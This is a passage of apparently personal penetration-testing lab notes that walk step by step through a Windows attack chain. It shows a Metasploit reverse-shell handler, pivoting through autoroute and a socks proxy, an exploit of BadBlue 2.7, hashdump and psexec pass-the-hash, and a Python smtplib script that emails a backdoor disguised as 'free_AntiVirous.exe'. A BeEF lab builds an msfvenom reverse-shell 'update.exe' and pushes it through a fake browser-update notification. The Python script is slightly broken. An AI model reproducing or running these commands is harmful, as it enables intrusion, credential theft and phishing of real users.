# =========================================================================
# 4) Running Metasploit handler
~$ msfconsole -q
msf6> use exploit/multi/handler
msf6 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler)> set LHOST=<yourIP>
msf6 exploit(multi/handler)> set LPORT=9988
msf6 exploit(multi/handler)> run
# =========================================================================
# While Our Handler Listening we should RUN our ython script in another terminal and whait
# If the target clickd on the sended email we will get a meterpreter sesstion
# =========================================================================
# 5) From Our Meterpreter sesstion, We Should now be able to Ping the non-reachable target demo1.target.local
meterpreter> getuid # To know Who U R ..
meterpreter> sysinfo # To Know What you Have ..
meterpreter> getprivs # To know What U Can Do !
meterpreter> getsystem # To get AUTHORITY\SYSTEM PRIV
meterpreter> shell # to get a shell prompt on your target
C:\windows\system32> ping demo1.target.local # Yes Its Reachable now ..
# Terminate this shell sesstion to back to your meterpreter sesstion
meterpreter> run autoroute -s <demo1 IP Address/subnet>
# After adding the route, Background this sesstion..
# =========================================================================
# 6) Integrate with demo1.target.local through our sesstion 1 ..
# Performing an Port Scan using Metasploit on demo1.target.local
msf6 exploit(multi/handler)> search socks_proxy
msf6 exploit(multi/handler)> use 0
msf6 auxiliary(server/socks_proxy)> cat /etc/proxychains4.conf # To know the defult port of socks4 -> 9050
msf6 auxiliary(server/socks_proxy)> show options
msf6 auxiliary(server/socks_proxy)> set SRVPORT 9050
msf6 auxiliary(server/socks_proxy)> set VERSION <UR Version>
msf6 auxiliary(server/socks_proxy)> exploit # Now You Could to go Put To make sure !..
msf6 auxiliary(server/socks_proxy)> jobs # This Should Print up the runnig job
# Open a new Terminal tab
~$ netstat -antp # this should gives you the port 9050 listen state
# Now to port scanning ..
~$ proxychains nmap -sT -Pn -F demo1.target.local # Gives us thet there web server runing on port 80
# semi Port Forwarding ...
# Back to your metasploit active sesstions tab ..
msf6 auxiliary(server/socks_proxy)> sesstions
msf6 auxiliary(server/socks_proxy)> sesstion 1
meterpreter> portfwd add -l 4455 -p 80 -r <demo1 IP Address>  # 4455 or whatever u want ...
# Back to a Blank new tab ..
~$ nmap -sV -p 4455 localhost # That gives us BadBlue 2.7
~$ searchsploit BadBlue 2.7 # Gives a good answer .. Lets go back to Metasploit ..
# =========================================================================
# 7) attacking the vulnerable app
msf6 auxiliary(server/socks_proxy)> search BadBlue # We Choosed 1
# We Dont have direct access to the demo1 so we will use bind shell ..
msf6 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/bind_tcp
msf6 exploit(windows/http/badblue_passthru) > set RHOSTS <demo1 IP Address>
msf6 exploit(windows/http/badblue_passthru) > set LPORT 9999
msf6 exploit(windows/http/badblue_passthru) > run
# =========================================================================
# 8) Some persistence:
meterpreter> pgrep explorer.exe # That should gives you a number to migrate ..
meterpreter> migrate 2948 # You are a New Person Now ! :D
meterpreter> hashdump # That should gives you an admin hash, Copy it and Background this sesstion .
msf6 exploit(windows/http/badblue_passthru) > search psexec
msf6 exploit(windows/smb/psexec) > show options
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > set LPORT 7777
msf6 exploit(windows/smb/psexec) > set RHOSTS <demo1 IP Address>
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass <TheHashThatYouJustDump>
msf6 exploit(windows/smb/psexec) > exploit
#======================================================================
# If EveryThing Goes Right .. We Wont need other sesstion now ..
```

```python
# =========================================================================
# ***email_sinding.py*** script that will utilize the smtp lib to sending for us
# If there something you dont understand or there is an error, Use ChatGPT
# =========================================================================
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
fromaddr = "attacker@fake.com"
toaddrr = "pop.demo@local"
# instance of MIMEMultipart
msg = MIMEMultipart()
msg ["From"] = fromaddr
msg ["To"] = toaddrr
msg ["Subject"] = "subject of email"
# string to store the body of email.
body = "Body_of_email"
msg .attach(MIMEText(message, "plain"))
# Opeining the file to be sent
fileName = "free_AntiVirous.exe"
attachment = open('/root/backdoor.exe', 'rb')
# Instance of MIMEBase and named as p
p = MIMEBase('application', 'octet-stream')
# To Change the payload to encoded form
p.set_payload((attachment).read())
# encode into base64
encoders.encode_base64(p)
p.add_header ("content-Disposition","attachment; filename= %s" %filename)
# attach p to msg ..
msg.attach(p)
# Creating SMTP Sesstion
s = smtplib.SMTP('demo.target.local', 25)
text = msg.as_string()
# sending
s.sendmail(fromaddr, toaddrr, text)
s.quit()
```

---

### Establishing a Shell Through The Victim Browser - LAB Demo

```bash
# Tools Used :
# 1.BeEF | 2. A Fake WebSite That had our Hooking URL.
# ==========================================================
# 1) Open The Search bar in kali and run BeEF From it ..
# Once its running you will provide with Panel URL and Hook URL, Copy The Panel and Paste in your Web Browser
# Access the FrameWork Using your Creds.
# => The Best Way to Use BeEF is to Create/Takeover a WebSite and integrate the framework with it .
# ==========================================================
# 2) Create a Basic WebPage and insert the Hook URL inside the <script></script> tag.
# => OFC You can do those steps on VPS...
# ==========================================================
# 3) Creating the payload that we will use to gain access
me@ME:/var/www/html~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(UR-IP) LPORT=9988 -f exe > update.exe
# We Going to Prompt that the Web Broswer Require an update and make your target install our exe
# ==========================================================
# # Setting our Hnadler
~$ msfconsole -q
msf6> use exploit/multi/handler
msf6 exploit(multi/handler)> set windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler)> set LHOST=<yourIP>
msf6 exploit(multi/handler)> set LPORT=9988
msf6 exploit(multi/handler)> run
# When your target access this webpage the BeEF framework will hook hes browser..
# When the Browser Hooked , Move to the online browser -> your target -> Commands -> Social Engineering
# We Can see a Lot of things in here .. We choose (Fake Notification bar Firefox)
# Change the Plugin URL to the actuall address that hosting our exe ...
# Change the text as you see it suitable ...
# When Our Target download and execute it we should have reverse shell on our handler
 	## Its Highlly Recommended to play around with BeEF Functionalities .. Its pretty easy and cool
```
